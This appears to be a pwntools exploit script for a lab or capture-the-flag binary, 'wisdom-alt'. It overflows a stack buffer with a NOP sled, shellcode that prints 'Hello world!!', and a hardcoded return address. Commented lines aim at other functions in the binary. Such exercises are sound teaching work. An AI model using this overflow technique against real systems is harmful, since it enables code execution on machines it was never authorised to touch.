from pwn import *
context.arch='i386'
context.os='linux'
filename = "./wisdom-alt"
r = process([filename])
stop = input()
print(r.recv())
#ret_addr = 0x565562ad #per secret key 0x565564e3
#ret_addr = 0x565562e5 #per pat_on_back
ret_addr = 0xffffd27c - 152 #per shell
addr = p32(ret_addr, endian='little')
nop = asm('nop', arch='i386')
s_code = shellcraft.i386.linux.echo('Hello world!!') + shellcraft.i386.linux.exit()
s_code_asm = asm(s_code)
#payload = b"2\n" + b"A"*1022
payload = nop*(152 - len(s_code_asm) - 64) + s_code_asm + nop*64 + addr #per shell
#payload += nop*152 + addr
#payload = cyclic(length=200, n = 4)
#payload = nop*152 + addr #per secret_key
#payload = nop*152 + addr #per pat_on_back
r.sendline(b"2")
print(r.recv())
# send payload
r.sendline(payload)
print(r.recv())

with open("./shellcode_payload", "wb") as f:
	f.write(payload)
